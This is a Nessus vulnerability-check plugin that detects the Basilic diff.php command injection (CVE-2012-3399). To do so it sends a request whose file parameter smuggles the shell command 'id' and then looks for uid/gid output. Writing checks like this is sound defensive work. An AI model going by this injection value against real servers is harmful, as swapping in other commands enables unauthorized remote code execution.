#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59850);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2016/10/07 13:30:46 $");

  script_cve_id("CVE-2012-3399");
  script_bugtraq_id(54234);
  script_osvdb_id(83719);
  script_xref(name:"EDB-ID", value:"19631");

  script_name(english:"Basilic diff.php Command Injection");
  script_summary(english:"Tries to run the id command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The bibliography application hosted on the remote web server has a
command injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"Basilic, a bibliography server for research laboratories, has a
command injection vulnerability.  Input to the file parameter of
diff.php is not properly sanitized.  A remote, unauthenticated
attacker could exploit this to execute arbitrary shell commands."
  );
  script_set_attribute(attribute:"see_also",value:"http://seclists.org/bugtraq/2012/Jul/1");
  script_set_attribute(
    attribute:"solution",
    value:"There is no known solution at this time."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Basilic 1.5.14 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Basilic 1.5.14 diff.php Arbitrary Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"vuln_publication_date",value:"2012/06/30");
  script_set_attribute(attribute:"plugin_publication_date",value:"2012/07/05");
  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:artis.imag:basilic");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("audit.inc");

port = get_http_port(default:80, php:TRUE);
dirs = list_uniq(make_list('/basilic', cgi_dirs()));
installs = NULL;

foreach dir (dirs)
{
  url = dir + '/Config/diff.php?file=%26id&new=1&old=2';
  res = http_send_recv3(method:'GET', item:url, port:port, exit_on_fail:TRUE);

  if ('<h1>File conflict solver</h1>' >< res[2] && output = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res[2]))
  {
    if (report_verbosity > 0)
    {
      header = 'Nessus executed the "id" command with the following request';

      if (report_verbosity > 1)
        trailer = 'This command returned the following output :\n\n' + chomp(output);
      else
        trailer = NULL;

      report = get_vuln_report(items:url, header:header, trailer:trailer, port:port);
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
    # never reached
  }
}

exit(0, 'No vulnerable installs were detected on port ' + port);
